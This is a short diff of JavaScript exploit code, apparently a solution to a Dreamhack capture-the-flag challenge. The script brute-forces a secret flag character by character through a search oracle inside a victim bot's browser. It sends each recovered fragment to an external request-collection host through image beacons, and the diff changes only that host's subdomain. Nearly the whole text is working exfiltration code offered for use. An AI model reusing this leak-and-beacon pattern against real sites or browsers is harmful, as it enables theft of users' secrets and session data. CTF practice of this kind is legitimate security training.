@@ -32,7 +32,7 @@
 
     async function findFlag() {
         // 접속 확인 신호
-        new Image().src = "https://jkgnhat.request.dreamhack.games?start=started";
+        new Image().src = "https://qrnfmov.request.dreamhack.games?start=started";
 
         // 봇의 짧은 생존 시간 동안 최대한 많이 시도
         for (let i = 0; i < 35; i++) {
@@ -41,14 +41,14 @@
                 if (await searchChar(flag + c)) {
                     flag += c;
                     // 찾자마자 즉시 전송
-                    new Image().src = "https://jkgnhat.request.dreamhack.games?flag=" + encodeURIComponent(flag);
+                    new Image().src = "https://qrnfmov.request.dreamhack.games?flag=" + encodeURIComponent(flag);
                     found = true;
                     if (c === "}") return;
                     break;
                 }
             }
             if (!found) {
-                new Image().src = "https://jkgnhat.request.dreamhack.games?error=notfound";
+                new Image().src = "https://qrnfmov.request.dreamhack.games?error=notfound";
                 break;
             }
         }
